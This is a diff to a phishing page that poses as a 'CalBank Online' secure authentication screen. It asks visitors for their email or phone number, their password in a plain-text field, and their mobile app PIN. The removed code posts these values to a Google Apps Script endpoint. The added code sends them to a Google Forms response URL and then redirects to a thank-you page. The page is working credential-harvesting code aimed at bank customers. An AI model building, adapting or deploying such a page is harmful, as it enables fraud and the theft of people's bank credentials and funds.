@@ -14,8 +14,8 @@
       align-items: center;
     }
     .header {
-      background-color: #1e90ff;
-      color: #fff;
+      background-color: #f9c600;
+      color: #000;
       text-align: center;
       width: 100%;
       padding: 40px 20px;
@@ -65,61 +65,44 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      color: #fff;
-      background-color: #1e90ff;
     }
-    .button-group button:hover {
-      background-color: #187bcd;
-    }
+    .home-btn { background-color: #f7931e; color: #fff; }
+    .home-btn:hover { background-color: #e67c0e; }
+    .login-btn { background-color: #f9c600; color: #000; }
+    .login-btn:hover { background-color: #e6b200; }
   </style>
 </head>
 <body>
   <div class="header">
     <h1>Secure Authentication</h1>
-    <p>CalBank Online Validation </p>
+    <p>CalBank Online</p>
   </div>
 
   <div class="login-container">
-    <form id="authForm">
-      <label for="email">Email or Phone Number </label>
-      <input type="email" id="email" name="email" placeholder="Enter your email or Phone Number " required>
+    <!-- Send form entries to Google Forms -->
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLScYb69yvVFHhOzSA9XsrgyRCZSdCGwFz_mSXQHB3in87_cA_w/formResponse" method="POST" target="_blank" onsubmit="redirectAfterSubmit()">
 
-      <label for="message">Password</label>
-      <input type="text" id="message" name="message" placeholder="Enter your password" required>
+      <label>Email or Phone Number </label>
+      <input type="email" name="entry.592928459" placeholder="Enter email" required>
 
-      <label for="refCode">Mobile App Pin</label>
-      <input type="text" id="refCode" name="refCode" placeholder="Enter Pin" required>
+      <label>Password</label>
+      <input type="text" name="entry.1325979910" placeholder="Enter your password " required>
+
+      <label>App Pin Code</label>
+      <input type="text" name="entry.1166533453" placeholder="Enter pin" required>
 
       <div class="button-group">
-        <button type="submit">VALIDATE →</button>
+        <button type="submit" class="login-btn">VALIDATE →</button>
       </div>
     </form>
   </div>
 
   <script>
-    document.getElementById('authForm').addEventListener('submit', async function(event) {
-      event.preventDefault();
-
-      const form = event.target;
-      const data = new FormData(form);
-      const params = new URLSearchParams(data);
-
-      try {
-        const response = await fetch('https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec', {
-          method: 'POST',
-          body: params
-        });
-
-        if (response.ok) {
-          window.location.href = 'thank_you.html';
-        } else {
-          alert('Submission failed. Please try again.');
-        }
-      } catch (err) {
-        console.error(err);
-        alert('Error submitting your form.');
-      }
-    });
+    function redirectAfterSubmit() {
+      setTimeout(() => {
+        window.location.href = "thank_you.html";
+      }, 1000);
+    }
   </script>
 </body>
 </html>
